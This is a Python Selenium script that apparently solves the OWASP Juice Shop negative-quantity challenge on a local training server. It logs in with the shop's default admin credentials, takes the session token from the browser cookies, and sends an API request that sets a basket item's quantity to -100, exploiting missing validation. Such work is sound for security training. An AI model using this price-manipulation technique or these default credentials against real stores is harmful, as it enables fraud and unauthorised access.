from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import requests
import json

def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()

    # Open the webpage
    driver.get("http://localhost:3000/#/")  # URL for the local server

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # Log in with a valid user
    login_user(driver)

    # Capture the authorization token after login then use it to make requests
    token = acquire_token(driver)
    basket_id = 1
    product_id = 7

    if token:
        print("Successfully acquired token.")
        # print(f"Successfully acquired token: {token}")

        # Get the basket ID
        basketid = acquire_basket_id(driver)

        print(f"basket id from acquire_basket_id: {basketid}")

        # Add the product to the basket and capture the response
        added_item_response = add_product_to_basket(token, product_id, 1, basket_id)

        if added_item_response:
            # Get the basket item ID from the response
            basket_item_id = added_item_response['data']['id']  # This should be the basket item ID
            print(f"Basket item ID: {basket_item_id}")

            print("Updating quantity to -100...")
            # Now, update the item quantity to a negative value
            update_item_quantity_to_negative(token, basketid, basket_item_id)

        print("Navigating to basket...")
        # Navigate to the basket to verify the update
        navigate_to_basket(driver)
    else:
        print("Failed to capture the auth token.")

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()


def add_product_to_basket(token, product_id, quantity, basket_id):
    url = "http://localhost:3000/api/BasketItems"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    print(f"payload contains in add_product_to_basket contains: product_id :{product_id}   quantity: {quantity}     basket_id: {basket_id}")

    # Add product to basket with specified quantity
    payload = {
        "ProductId": product_id,
        "quantity": quantity,
        "BasketId": basket_id
    }

    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200:
        print(f"Successfully added product {product_id} to basket.")
        return response.json()  # Return the response for further processing, should contain basket item ID
    else:
        print(f"Error while adding product: {response.status_code}, {response.text}")
        return None


def update_item_quantity_to_negative(token, basketid, basket_item_id):
    # URL to update basket item with its unique basket item ID
    url = f"http://localhost:3000/api/BasketItems/{basket_item_id}"

    print(f"Changing item with id {basket_item_id} to -100...")

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # The payload with the negative quantity (-100)
    payload = {
        "quantity": -100  # Negative quantity to complete the achievement
    }

    # Sending PUT request to update the quantity of the product in the basket
    response = requests.put(url, json=payload, headers=headers)

    if response.status_code == 200:
        print(f"Successfully updated product quantity to negative in basket {basketid}.")
    else:
        print(f"Failed to update item: {response.status_code}, {response.text}")


def login_user(driver):
    # login as normal user
    WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "navbarAccount"))
    ).click()

    # get to login page
    WebDriverWait(driver, 10).until (
        EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
    ).click()

    # Put in email & password
    emailField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys("admin@juice-sh.op")  # Example email

    passwordField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "password"))
    )
    passwordField.send_keys("admin123")  # Example password
    passwordField.send_keys(Keys.RETURN)  # This hits 'enter' to log in

    time.sleep(2)  # Allow login process to start


def acquire_token(driver):
    cookies = driver.get_cookies()

    for cookie in cookies:
        if cookie['name'] == 'token':
            return cookie['value']
    return None


def acquire_basket_id(driver):
    # Retrieve the basketid from sessionStorage located in applications -> storage
    basket_id = driver.execute_script("return sessionStorage.getItem('bid');")
    
    if not basket_id:
        print("Basket ID could not be found in sessionStorage.")
    else:
        print(f"Basket ID found: {basket_id}")
    
    return basket_id


def navigate_to_basket(driver):
    # Navigate to the basket page
    driver.get("http://localhost:3000/#/basket")

    # Wait for the basket to load
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CLASS_NAME, "mat-card"))
    )

    print("Navigated to the basket page.")

    # Inspecting cookies shows negative item total, making you rich!
    print("Inspecting cookies after navigating to basket:")
    cookies = driver.get_cookies()
    for cookie in cookies:
        print(f"{cookie['name']}: {cookie['value']}")

    time.sleep(3)  # Wait a bit to inspect the basket page


if __name__ == "__main__":
    main()
